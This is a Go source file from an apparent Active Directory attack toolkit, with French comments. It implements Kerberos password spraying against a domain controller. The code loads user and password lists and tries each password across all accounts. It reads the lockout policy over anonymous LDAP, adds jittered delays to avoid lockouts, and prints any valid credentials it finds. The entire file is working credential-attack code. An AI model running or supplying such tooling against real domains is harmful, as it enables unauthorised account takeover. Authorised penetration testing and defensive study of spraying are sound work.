// pkg/spray/spray.go
package spray

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	"adgo/pkg/ldap"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// SprayConfig configuration du password spraying
type SprayConfig struct {
	UsersFile     string
	PasswordsFile string
	Domain        string
	DCIP          string
	Delay         int // Délai entre tentatives (secondes)
	Jitter        int // Variation aléatoire du délai (%)
	Threads       int // Nombre de threads parallèles
	Verbose       bool
	LockoutCheck  bool // Vérifier la politique de lockout avant de commencer
	StopOnSuccess bool // Arrêter dès la première réussite
}

// SprayResult résultat d'une tentative de spray
type SprayResult struct {
	Username  string
	Password  string
	Success   bool
	Error     string
	Timestamp time.Time
}

// SpraySummary résumé global du spray
type SpraySummary struct {
	TotalAttempts   int
	SuccessfulCreds []SprayResult
	FailedAttempts  int
	LockedAccounts  []string
	Duration        time.Duration
	StartTime       time.Time
	EndTime         time.Time
}

// PasswordSpray exécute un password spray avec protection anti-lockout
func PasswordSpray(cfg *SprayConfig) (*SpraySummary, error) {
	summary := &SpraySummary{
		StartTime: time.Now(),
	}

	// 1. Charger les utilisateurs
	users, err := loadLines(cfg.UsersFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load users: %v", err)
	}

	// 2. Charger les mots de passe
	passwords, err := loadLines(cfg.PasswordsFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load passwords: %v", err)
	}

	fmt.Printf("[*] Loaded %d users and %d passwords\n", len(users), len(passwords))

	// 3. Vérifier la politique de lockout (IMPORTANT!)
	if cfg.LockoutCheck {
		if err := checkLockoutPolicy(cfg.Domain, cfg.DCIP); err != nil {
			fmt.Printf("[!] Warning: Could not verify lockout policy: %v\n", err)
			fmt.Println("[!] Continuing anyway - be careful!")
		}
	}

	// 4. Calculer le délai sécurisé
	safeDelay := calculateSafeDelay(cfg.Delay, len(users))
	fmt.Printf("[*] Using delay: %d seconds (±%d%% jitter)\n", safeDelay, cfg.Jitter)
	fmt.Printf("[*] Estimated duration: %v\n", estimateDuration(len(users), len(passwords), safeDelay))

	// 5. Exécuter le spray
	results := make(chan SprayResult, len(users)*len(passwords))
	var wg sync.WaitGroup

	// Spray par mot de passe (PAS par utilisateur!)
	// Pourquoi ? Pour éviter les lockouts : on teste password1 sur TOUS les users,
	// puis on attend, puis password2 sur TOUS les users, etc.
	for _, password := range passwords {
		fmt.Printf("\n[*] Spraying password: %s\n", maskPassword(password))

		for _, username := range users {
			wg.Add(1)

			// Limiter la concurrence
			if cfg.Threads > 1 {
				// TODO: Implémenter un worker pool
			}

			go func(user, pass string) {
				defer wg.Done()

				result := tryCredential(user, pass, cfg.Domain, cfg.DCIP)
				results <- result

				if cfg.Verbose || result.Success {
					printResult(result)
				}

				summary.TotalAttempts++
				if result.Success {
					summary.SuccessfulCreds = append(summary.SuccessfulCreds, result)

					if cfg.StopOnSuccess {
						fmt.Println("[+] Success! Stopping spray...")
						return
					}
				} else {
					summary.FailedAttempts++
				}

				// Délai avec jitter
				delay := applyJitter(safeDelay, cfg.Jitter)
				time.Sleep(time.Duration(delay) * time.Second)
			}(username, password)
		}

		wg.Wait()

		// Pause entre chaque mot de passe
		if len(passwords) > 1 {
			pauseDuration := time.Duration(safeDelay*2) * time.Second
			fmt.Printf("[*] Pausing %v before next password...\n", pauseDuration)
			time.Sleep(pauseDuration)
		}
	}

	close(results)

	summary.EndTime = time.Now()
	summary.Duration = summary.EndTime.Sub(summary.StartTime)

	return summary, nil
}

// tryCredential teste une combinaison user/password via Kerberos
func tryCredential(username, password, domain, dcIP string) SprayResult {
	result := SprayResult{
		Username:  username,
		Password:  password,
		Timestamp: time.Now(),
	}

	realm := strings.ToUpper(domain)

	// Configuration Kerberos minimale
	krb5Conf := fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_kdc = false

[realms]
    %s = {
        kdc = %s:88
    }`, realm, realm, dcIP)

	cfg, err := config.NewFromString(krb5Conf)
	if err != nil {
		result.Error = fmt.Sprintf("config error: %v", err)
		return result
	}

	// Tenter l'authentification
	cl := client.NewWithPassword(username, realm, password, cfg,
		client.DisablePAFXFAST(true))

	err = cl.Login()
	if err == nil {
		result.Success = true
		return result
	}

	// Analyser l'erreur
	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
		result.Error = "invalid credentials"
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		result.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		result.Error = "account locked or disabled"
	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED"):
		result.Error = "password expired"
	default:
		result.Error = fmt.Sprintf("KDC error: %v", err)
	}

	return result
}

// checkLockoutPolicy vérifie la politique de lockout du domaine
func checkLockoutPolicy(domain, dcIP string) error {
	fmt.Println("[*] Checking domain lockout policy...")

	ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
	baseDN := domainToBaseDN(domain)

	// Connexion anonyme ou avec credentials ?
	// Pour simplifier, on tente une connexion anonyme
	ctx := context.Background()
	client, err := ldap.NewClient(ctx, ldapURL, "", "", false)
	if err != nil {
		return fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer client.Close()

	policy, err := client.GetPasswordPolicy(baseDN)
	if err != nil {
		return fmt.Errorf("failed to get password policy: %v", err)
	}

	fmt.Printf("[*] Domain Password Policy:\n")
	fmt.Printf("    Lockout Threshold: %d attempts\n", policy.LockoutThreshold)
	fmt.Printf("    Lockout Duration: %d minutes\n", policy.LockoutDurationMinutes)
	fmt.Printf("    Min Password Length: %d\n", policy.MinPasswordLength)

	if policy.LockoutThreshold > 0 && policy.LockoutThreshold < 5 {
		fmt.Printf("[!] WARNING: Low lockout threshold (%d)! Be very careful.\n", policy.LockoutThreshold)
		fmt.Println("[!] Recommended: Use only 1-2 passwords per spray round")
	}

	return nil
}

// calculateSafeDelay calcule un délai sécurisé basé sur le nombre d'utilisateurs
func calculateSafeDelay(baseDelay, userCount int) int {
	// Règle générale : plus il y a d'utilisateurs, moins on a besoin de délai
	// Car on ne reteste jamais le même user immédiatement

	if userCount > 100 {
		return baseDelay / 2
	}
	if userCount > 50 {
		return baseDelay
	}
	return baseDelay * 2
}

// applyJitter ajoute une variation aléatoire au délai
func applyJitter(delay, jitterPercent int) int {
	if jitterPercent == 0 {
		return delay
	}

	variation := float64(delay) * (float64(jitterPercent) / 100.0)
	jitter := rand.Float64()*variation*2 - variation

	result := delay + int(jitter)
	if result < 1 {
		return 1
	}
	return result
}

// estimateDuration estime la durée totale du spray
func estimateDuration(users, passwords, delay int) time.Duration {
	totalAttempts := users * passwords
	totalSeconds := totalAttempts * delay

	// Ajouter les pauses entre passwords
	pauseSeconds := (passwords - 1) * delay * 2

	return time.Duration(totalSeconds+pauseSeconds) * time.Second
}

// printResult affiche un résultat de façon formatée
func printResult(r SprayResult) {
	timestamp := r.Timestamp.Format("15:04:05")

	if r.Success {
		fmt.Printf("[%s] [+] SUCCESS: %s:%s\n", timestamp, r.Username, r.Password)
	} else {
		if r.Error == "account locked or disabled" {
			fmt.Printf("[%s] [!] LOCKED: %s\n", timestamp, r.Username)
		} else {
			fmt.Printf("[%s] [-] %s:%s - %s\n", timestamp, r.Username, maskPassword(r.Password), r.Error)
		}
	}
}

// PrintSummary affiche un résumé du spray
func PrintSummary(summary *SpraySummary) {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("PASSWORD SPRAY SUMMARY")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("Duration: %v\n", summary.Duration)
	fmt.Printf("Total Attempts: %d\n", summary.TotalAttempts)
	fmt.Printf("Successful: %d\n", len(summary.SuccessfulCreds))
	fmt.Printf("Failed: %d\n", summary.FailedAttempts)

	if len(summary.SuccessfulCreds) > 0 {
		fmt.Println("\n[+] VALID CREDENTIALS:")
		for _, cred := range summary.SuccessfulCreds {
			fmt.Printf("    %s:%s\n", cred.Username, cred.Password)
		}
	}

	if len(summary.LockedAccounts) > 0 {
		fmt.Println("\n[!] POTENTIALLY LOCKED ACCOUNTS:")
		for _, account := range summary.LockedAccounts {
			fmt.Printf("    %s\n", account)
		}
	}

	fmt.Println(strings.Repeat("=", 60))
}

// Helpers

func loadLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}

	return lines, scanner.Err()
}

func maskPassword(password string) string {
	if len(password) <= 3 {
		return "***"
	}
	return password[:2] + strings.Repeat("*", len(password)-2)
}

func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	dnParts := make([]string, len(parts))
	for i, part := range parts {
		dnParts[i] = "DC=" + part
	}
	return strings.Join(dnParts, ",")
}
